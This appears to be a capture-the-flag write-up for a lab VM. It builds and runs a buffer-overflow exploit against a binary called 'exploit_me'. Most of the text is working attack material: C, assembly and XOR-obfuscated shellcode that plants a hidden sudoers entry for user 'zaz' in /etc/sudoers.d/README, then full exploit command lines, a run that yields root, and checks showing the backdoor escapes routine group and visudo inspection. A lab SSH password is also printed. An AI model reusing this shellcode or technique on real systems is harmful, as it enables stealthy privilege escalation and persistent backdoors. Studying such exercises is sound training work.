# Hidden sudo user
- The goal is to exploit `exploit_me` with a custom shellcode to give zaz sudo's privileges, the shellcode is polymorphed to escape strcpy restrictions
- Sudoer config line `zaz ALL=(ALL:ALL) ALL` will be hidden in `/etc/sudoers.d/README`
- Since the file is in read only mode, some chmod calls are required

## C Code
Snippet of the shellcode behavior written in C
```C
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>

#define PATH "/etc/sudoers.d/README"
#define CONTENT "zaz ALL=(ALL:ALL) ALL\n"
# define ONE 1
# define LENGTH 23
# define MODE 0777
# define DEFAULT_MODE 0440

void main(void)
{
	chmod(PATH, MODE);
	write(open(PATH, ONE), CONTENT, LENGTH);
	chmod(PATH, DEFAULT_MODE);
	write(1, "\033c\033[5;1;31mPWNED\n", 17);
	exit(1);
}
```
## ASM x86
- To craft our shellcode from the C code, we must convert it in ASM
- XOR operations are here to obfuscate and bypass the limitations of strcpy, our shellcode must not contain any NULL byte nor whitespaces characters
```nasm
GLOBAL _start

section .text

_start:
	; ##### FIRST CHMOD #####
	; # Pushing '/etc/sudoers.d/README' on the stack
	xor edx, edx
	mov dl, 0x45
	push edx
	mov edx, 0xd4ddd8dc
	xor edx, 0x99999999
	push edx
	mov edx, 0xcbb6fdb7
	xor edx, 0x99999999
	push edx
	mov edx, 0xeaebfcf6
	xor edx, 0x99999999
	push edx
	push 0x6475732f
	mov edx, 0xfaedfcb6
	xor edx, 0x99999999
	push edx
	; # Setting registers for chmod syscall
	mov ebx, esp
	xor ecx, ecx
	mov cx, 0x01ff ; 0777
	xor eax, eax
	mov al, 15 ; chmod syscall number
	int 0x80

	; ##### OPEN #####
	; # Pushing '/etc/sudoers.d/README' on the stack
	xor edx, edx
	mov dl, 0x45
	push edx
	mov edx, 0xd4ddd8dc
	xor edx, 0x99999999
	push edx
	mov edx, 0xcbb6fdb7
	xor edx, 0x99999999
	push edx
	mov edx, 0xeaebfcf6
	xor edx, 0x99999999
	push edx
	push 0x6475732f
	mov edx, 0xfaedfcb6
	xor edx, 0x99999999
	push edx
	mov ebx, esp
	; # Setting registers for open syscall	
	xor ecx, ecx
	mov cl, 0x01 ; O_WRONLY
	xor eax, eax
	mov al, 5 ; open syscall number
	int 0x80

	; ##### WRITE #####
	; # Saving the open ret
	mov ebx, eax
	; # Pushing 'zaz ALL=(ALL:ALL) ALL\n' on the stack
	mov edx, 0x66456c2a
	xor edx, 0x66666666
	push edx
	mov edx, 0x2a27464f
	xor edx, 0x66666666
	push edx
	push 0x4c4c413a
	push 0x4c4c4128
	push 0x3d4c4c41
	mov edx, 0x461c071c
	xor edx, 0x66666666
	push edx
	mov ecx, esp
	; # Setting registers for write syscall 
	xor edx, edx
	mov dl, 23 ; length to write
	xor eax, eax
	mov al, 4 ; write syscall number
	int 0x80

	; ##### SECOND CHMOD #####
	; # Pushing '/etc/sudoers.d/README' on the stack
	xor edx, edx
	mov dl, 0x45
	push edx
	mov edx, 0xd4ddd8dc
	xor edx, 0x99999999
	push edx
	mov edx, 0xcbb6fdb7
	xor edx, 0x99999999
	push edx
	mov edx, 0xeaebfcf6
	xor edx, 0x99999999
	push edx
	push 0x6475732f
	mov edx, 0xfaedfcb6
	xor edx, 0x99999999
	push edx
	mov ebx, esp
	; # Setting registers for chmod syscall
	mov ecx, 0x999998b9 ; XOR 0440
	xor ecx, 0x99999999
	xor eax, eax
	mov al, 15 ; chmod syscall number
	int 0x80

	; ##### PIMPED CHAD MOMENT (SHINY WRITE) #####
	xor edx, edx
	push edx
	push 0x44454e57
	push 0x506d3133
	push 0x3b313b35
	push 0x5b1b631b
	; # Setting registers for write syscall
	xor ebx, ebx
	mov bl, 0x1 ; fd
	mov ecx, esp
	xor edx, edx
	mov dl, 17 ; length to write
	xor eax, eax
	mov al, 0x4 ; write syscall number
	int 0x80

	; ##### EXIT #####
	xor eax, eax
	mov al, 0x01 ; exit syscall number
	xor ebx,ebx
	int 0x80
```

## Disassembly
https://defuse.ca/online-x86-assembler.htm#disassembly
```nasm
31 d2 					xor edx,edx  
b2 45 					mov dl,0x45  
52 					push edx  
ba dc d8 dd d4 				mov edx,0xd4ddd8dc  
81 f2 99 99 99 99 			xor edx,0x99999999  
52 					push edx  
ba b7 fd b6 cb 				mov edx,0xcbb6fdb7  
81 f2 99 99 99 99 			xor edx,0x99999999  
52 					push edx  
ba f6 fc eb ea 				mov edx,0xeaebfcf6  
81 f2 99 99 99 99 			xor edx,0x99999999  
52 					push edx  
68 2f 73 75 64 				push 0x6475732f  
ba b6 fc ed fa 				mov edx,0xfaedfcb6  
81 f2 99 99 99 99 			xor edx,0x99999999  
52 					push edx  
89 e3 					mov ebx,esp  
31 c9 					xor ecx,ecx  
66 b9 ff 01 				mov cx,0x1ff  
31 c0 					xor eax,eax  
b0 0f 					mov al,0xf  
cd 80 					int 0x80  
31 d2 					xor edx,edx  
b2 45 					mov dl,0x45  
52 					push edx  
ba dc d8 dd d4 				mov edx,0xd4ddd8dc  
81 f2 99 99 99 99 			xor edx,0x99999999  
52 					push edx  
ba b7 fd b6 cb 				mov edx,0xcbb6fdb7  
81 f2 99 99 99 99 			xor edx,0x99999999  
52 					push edx  
ba f6 fc eb ea 				mov edx,0xeaebfcf6  
81 f2 99 99 99 99 			xor edx,0x99999999  
52 					push edx  
68 2f 73 75 64 				push 0x6475732f  
ba b6 fc ed fa 				mov edx,0xfaedfcb6  
81 f2 99 99 99 99 			xor edx,0x99999999  
52 					push edx  
89 e3 					mov ebx,esp  
31 c9 					xor ecx,ecx  
b1 01 					mov cl,0x1  
31 c0 					xor eax,eax  
b0 05 					mov al,0x5  
cd 80 					int 0x80  
89 c3 					mov ebx,eax  
ba 2a 6c 45 66 				mov edx,0x66456c2a  
81 f2 66 66 66 66 			xor edx,0x66666666  
52 					push edx  
ba 4f 46 27 2a 				mov edx,0x2a27464f  
81 f2 66 66 66 66 			xor edx,0x66666666  
52 					push edx  
68 3a 41 4c 4c				push 0x4c4c413a  
68 28 41 4c 4c 				push 0x4c4c4128  
68 41 4c 4c 3d 				push 0x3d4c4c41  
ba 1c 07 1c 46 				mov edx,0x461c071c  
81 f2 66 66 66 66 			xor edx,0x66666666  
52 					push edx  
89 e1 					mov ecx,esp  
31 d2 					xor edx,edx  
b2 17 					mov dl,0x17  
31 c0 					xor eax,eax  
b0 04 					mov al,0x4  
cd 80 					int 0x80  
31 d2 					xor edx,edx  
b2 45					mov dl,0x45  
52 					push edx  
ba dc d8 dd d4 				mov edx,0xd4ddd8dc  
81 f2 99 99 99 99 			xor edx,0x99999999  
52 					push edx  
ba b7 fd b6 cb 				mov edx,0xcbb6fdb7  
81 f2 99 99 99 99 			xor edx,0x99999999  
52 					push edx  
ba f6 fc eb ea 				mov edx,0xeaebfcf6  
81 f2 99 99 99 99 			xor edx,0x99999999  
52 					push edx  
68 2f 73 75 64 				push 0x6475732f  
ba b6 fc ed fa 				mov edx,0xfaedfcb6  
81 f2 99 99 99 99 			xor edx,0x99999999  
52 					push edx  
89 e3 					mov ebx,esp  
b9 b9 98 99 99 				mov ecx,0x999998b9  
81 f1 99 99 99 99 			xor ecx,0x99999999  
31 c0 					xor eax,eax  
b0 0f 					mov al,0xf  
cd 80 					int 0x80  
31 d2 					xor edx,edx  
52 					push edx  
68 57 4e 45 44 				push 0x44454e57  
68 33 31 6d 50 				push 0x506d3133  
68 35 3b 31 3b 				push 0x3b313b35  
68 1b 63 1b 5b 				push 0x5b1b631b  
31 db 					xor ebx,ebx  
b3 01 					mov bl,0x1  
89 e1 					mov ecx,esp  
31 d2 					xor edx,edx  
b2 11 					mov dl,0x11  
31 c0 					xor eax,eax  
b0 04 					mov al,0x4  
cd 80 					int 0x80  
31 c0 					xor eax,eax  
b0 01 					mov al,0x1  
31 db 					xor ebx,ebx  
cd 80 					int 0x80
```
- Final shellcode:
```
\x31\xD2\xB2\x45\x52\xBA\xDC\xD8\xDD\xD4\x81\xF2\x99\x99\x99\x99\x52\xBA\xB7\xFD\xB6\xCB\x81\xF2\x99\x99\x99\x99\x52\xBA\xF6\xFC\xEB\xEA\x81\xF2\x99\x99\x99\x99\x52\x68\x2F\x73\x75\x64\xBA\xB6\xFC\xED\xFA\x81\xF2\x99\x99\x99\x99\x52\x89\xE3\x31\xC9\x66\xB9\xFF\x01\x31\xC0\xB0\x0F\xCD\x80\x31\xD2\xB2\x45\x52\xBA\xDC\xD8\xDD\xD4\x81\xF2\x99\x99\x99\x99\x52\xBA\xB7\xFD\xB6\xCB\x81\xF2\x99\x99\x99\x99\x52\xBA\xF6\xFC\xEB\xEA\x81\xF2\x99\x99\x99\x99\x52\x68\x2F\x73\x75\x64\xBA\xB6\xFC\xED\xFA\x81\xF2\x99\x99\x99\x99\x52\x89\xE3\x31\xC9\xB1\x01\x31\xC0\xB0\x05\xCD\x80\x89\xC3\xBA\x2A\x6C\x45\x66\x81\xF2\x66\x66\x66\x66\x52\xBA\x4F\x46\x27\x2A\x81\xF2\x66\x66\x66\x66\x52\x68\x3A\x41\x4C\x4C\x68\x28\x41\x4C\x4C\x68\x41\x4C\x4C\x3D\xBA\x1C\x07\x1C\x46\x81\xF2\x66\x66\x66\x66\x52\x89\xE1\x31\xD2\xB2\x17\x31\xC0\xB0\x04\xCD\x80\x31\xD2\xB2\x45\x52\xBA\xDC\xD8\xDD\xD4\x81\xF2\x99\x99\x99\x99\x52\xBA\xB7\xFD\xB6\xCB\x81\xF2\x99\x99\x99\x99\x52\xBA\xF6\xFC\xEB\xEA\x81\xF2\x99\x99\x99\x99\x52\x68\x2F\x73\x75\x64\xBA\xB6\xFC\xED\xFA\x81\xF2\x99\x99\x99\x99\x52\x89\xE3\xB9\xB9\x98\x99\x99\x81\xF1\x99\x99\x99\x99\x31\xC0\xB0\x0F\xCD\x80\x31\xD2\x52\x68\x57\x4E\x45\x44\x68\x33\x31\x6D\x50\x68\x35\x3B\x31\x3B\x68\x1B\x63\x1B\x5B\x31\xDB\xB3\x01\x89\xE1\x31\xD2\xB2\x11\x31\xC0\xB0\x04\xCD\x80\x31\xC0\xB0\x01\x31\xDB\xCD\x80
```
## Crafting the exploit
### NOT OBFUSCATED WORKING VIRGIN SHELLCODE
1. Based on the observations for writeup1.md, the overflow occurs at 140 chars.  
```
./exploit_me $(python -c 'print "A"*140')
```
2. The whole shellcode will be stored in the buffer, we look at its address in GBD (`0xbffff600`) so we can redirect EIP on it when hitting a return.  
```
./exploit_me $(python -c 'prints "A"*140+"\x00\xf6\xff\xbf"')
```
3. Add some NOP padding to raise our chances to jump in the shellcode.  
```
./exploit_me $(python -c 'print "A"*140+"\x00\xf6\xff\xbf"+"\x90"*2014')
```
4. Adjust the jump's address a bit to make it work outside of GDB then paste the shellcode
```
./exploit_me $(python -c 'print "A"*140+"\xff\xf5\xff\xbf"+"\x90"*2014+"\x31\xD2\xB2\x45\x52\x68\x45\x41\x44\x4D\x68\x2E\x64\x2F\x52\x68\x6F\x65\x72\x73\x68\x2F\x73\x75\x64\x68\x2F\x65\x74\x63\x89\xE3\x31\xC9\x66\xB9\xFF\x01\x31\xC0\xB0\x5A\xCD\x80\x31\xD2\xB2\x45\x52\x68\x45\x41\x44\x4D\x68\x2E\x64\x2F\x52\x68\x6F\x65\x72\x73\x68\x2F\x73\x75\x64\x68\x2F\x65\x74\x63\x89\xE3\x31\xC9\xB1\x01\x31\xC0\xB0\x05\xCD\x80\x89\xC3\xBA\x2A\x6C\x45\x66\x81\xF2\x66\x66\x66\x66\x52\xBA\x4F\x46\x27\x2A\x81\xF2\x66\x66\x66\x66\x52\x68\x3A\x41\x4C\x4C\x68\x28\x41\x4C\x4C\x68\x41\x4C\x4C\x3D\xBA\x1C\x07\x1C\x46\x81\xF2\x66\x66\x66\x66\x52\x89\xE1\x31\xD2\xB2\x17\x31\xC0\xB0\x04\xCD\x80\x31\xD2\xB2\x45\x52\x68\x45\x41\x44\x4D\x68\x2E\x64\x2F\x52\x68\x6F\x65\x72\x73\x68\x2F\x73\x75\x64\x68\x2F\x65\x74\x63\x89\xE3\x31\xC9\x66\xB9\x20\x01\x31\xC0\xB0\x5A\xCD\x80\x31\xC0\xB0\x01\x31\xDB\xCD\x80"')
```
### PIMPED OBFUSCATED CHAD FINAL SHELLCODE
5. After some more obfuscating and a beautiful blinking `PWNED` message, the final shellcode will be   
```
./exploit_me $(python -c 'print "A"*140+"\xff\xf6\xff\xbf"+"\x90"*2014+"\x31\xD2\xB2\x45\x52\xBA\xDC\xD8\xDD\xD4\x81\xF2\x99\x99\x99\x99\x52\xBA\xB7\xFD\xB6\xCB\x81\xF2\x99\x99\x99\x99\x52\xBA\xF6\xFC\xEB\xEA\x81\xF2\x99\x99\x99\x99\x52\x68\x2F\x73\x75\x64\xBA\xB6\xFC\xED\xFA\x81\xF2\x99\x99\x99\x99\x52\x89\xE3\x31\xC9\x66\xB9\xFF\x01\x31\xC0\xB0\x0F\xCD\x80\x31\xD2\xB2\x45\x52\xBA\xDC\xD8\xDD\xD4\x81\xF2\x99\x99\x99\x99\x52\xBA\xB7\xFD\xB6\xCB\x81\xF2\x99\x99\x99\x99\x52\xBA\xF6\xFC\xEB\xEA\x81\xF2\x99\x99\x99\x99\x52\x68\x2F\x73\x75\x64\xBA\xB6\xFC\xED\xFA\x81\xF2\x99\x99\x99\x99\x52\x89\xE3\x31\xC9\xB1\x01\x31\xC0\xB0\x05\xCD\x80\x89\xC3\xBA\x2A\x6C\x45\x66\x81\xF2\x66\x66\x66\x66\x52\xBA\x4F\x46\x27\x2A\x81\xF2\x66\x66\x66\x66\x52\x68\x3A\x41\x4C\x4C\x68\x28\x41\x4C\x4C\x68\x41\x4C\x4C\x3D\xBA\x1C\x07\x1C\x46\x81\xF2\x66\x66\x66\x66\x52\x89\xE1\x31\xD2\xB2\x17\x31\xC0\xB0\x04\xCD\x80\x31\xD2\xB2\x45\x52\xBA\xDC\xD8\xDD\xD4\x81\xF2\x99\x99\x99\x99\x52\xBA\xB7\xFD\xB6\xCB\x81\xF2\x99\x99\x99\x99\x52\xBA\xF6\xFC\xEB\xEA\x81\xF2\x99\x99\x99\x99\x52\x68\x2F\x73\x75\x64\xBA\xB6\xFC\xED\xFA\x81\xF2\x99\x99\x99\x99\x52\x89\xE3\xB9\xB9\x98\x99\x99\x81\xF1\x99\x99\x99\x99\x31\xC0\xB0\x0F\xCD\x80\x31\xD2\x52\x68\x57\x4E\x45\x44\x68\x33\x31\x6D\x50\x68\x35\x3B\x31\x3B\x68\x1B\x63\x1B\x5B\x31\xDB\xB3\x01\x89\xE1\x31\xD2\xB2\x11\x31\xC0\xB0\x04\xCD\x80\x31\xC0\xB0\x01\x31\xDB\xCD\x80"')
```
## Running the exploit
- Connect to the machine
```
$ ssh zaz@192.168.56.105
[...]
zaz@192.168.56.105's password: 646da671ca01bb5d84dbb5fb2238dc8e
[...]
```
- Privileges check
```
$ sudo whoami
[sudo] password for zaz: 646da671ca01bb5d84dbb5fb2238dc8e
zaz is not in the sudoers file.  This incident will be reported.
```

- Run the exploit
```
$ ./exploit_me $(python -c 'print "A"*140+"\xff\xf6\xff\xbf"+"\x90"*2014+"\x31\xD2\xB2\x45\x52\xBA\xDC\xD8\xDD\xD4\x81\xF2\x99\x99\x99\x99\x52\xBA\xB7\xFD\xB6\xCB\x81\xF2\x99\x99\x99\x99\x52\xBA\xF6\xFC\xEB\xEA\x81\xF2\x99\x99\x99\x99\x52\x68\x2F\x73\x75\x64\xBA\xB6\xFC\xED\xFA\x81\xF2\x99\x99\x99\x99\x52\x89\xE3\x31\xC9\x66\xB9\xFF\x01\x31\xC0\xB0\x0F\xCD\x80\x31\xD2\xB2\x45\x52\xBA\xDC\xD8\xDD\xD4\x81\xF2\x99\x99\x99\x99\x52\xBA\xB7\xFD\xB6\xCB\x81\xF2\x99\x99\x99\x99\x52\xBA\xF6\xFC\xEB\xEA\x81\xF2\x99\x99\x99\x99\x52\x68\x2F\x73\x75\x64\xBA\xB6\xFC\xED\xFA\x81\xF2\x99\x99\x99\x99\x52\x89\xE3\x31\xC9\xB1\x01\x31\xC0\xB0\x05\xCD\x80\x89\xC3\xBA\x2A\x6C\x45\x66\x81\xF2\x66\x66\x66\x66\x52\xBA\x4F\x46\x27\x2A\x81\xF2\x66\x66\x66\x66\x52\x68\x3A\x41\x4C\x4C\x68\x28\x41\x4C\x4C\x68\x41\x4C\x4C\x3D\xBA\x1C\x07\x1C\x46\x81\xF2\x66\x66\x66\x66\x52\x89\xE1\x31\xD2\xB2\x17\x31\xC0\xB0\x04\xCD\x80\x31\xD2\xB2\x45\x52\xBA\xDC\xD8\xDD\xD4\x81\xF2\x99\x99\x99\x99\x52\xBA\xB7\xFD\xB6\xCB\x81\xF2\x99\x99\x99\x99\x52\xBA\xF6\xFC\xEB\xEA\x81\xF2\x99\x99\x99\x99\x52\x68\x2F\x73\x75\x64\xBA\xB6\xFC\xED\xFA\x81\xF2\x99\x99\x99\x99\x52\x89\xE3\xB9\xB9\x98\x99\x99\x81\xF1\x99\x99\x99\x99\x31\xC0\xB0\x0F\xCD\x80\x31\xD2\x52\x68\x57\x4E\x45\x44\x68\x33\x31\x6D\x50\x68\x35\x3B\x31\x3B\x68\x1B\x63\x1B\x5B\x31\xDB\xB3\x01\x89\xE1\x31\xD2\xB2\x11\x31\xC0\xB0\x04\xCD\x80\x31\xC0\xB0\x01\x31\xDB\xCD\x80"')
PWNED
```
- Privileges check
```
$ sudo whoami
[sudo] password for zaz: 646da671ca01bb5d84dbb5fb2238dc8e
root
```

# Evasion tests
```
$ grep -Po '^sudo.+:\K.*$' /etc/group
ft_root
```

```
$ getent group sudo | cut -d: -f4
ft_root
```

```
$ getent group zaz
zaz:x:1005:
```

```
$ getent group root
root:x:0:
```

```
$ cat /etc/group | grep sudo
sudo:x:27:ft_root
```

```
$ sudo visudo
	# User alias specification
	# Cmnd alias specification
	# User privilege specification
	root    ALL=(ALL:ALL) ALL
	# Members of the admin group may gain root privileges
	%admin ALL=(ALL) ALL
	# Allow members of group sudo to execute any command
	%sudo   ALL=(ALL:ALL) ALL
	# See sudoers(5) for more information on "#include" directives:
	#includedir /etc/sudoers.d
```

```
$ ls -l /etc/sudoers.d/
 total 4
 -r--r----- 1 root root 753 Nov 19 13:12 README
```
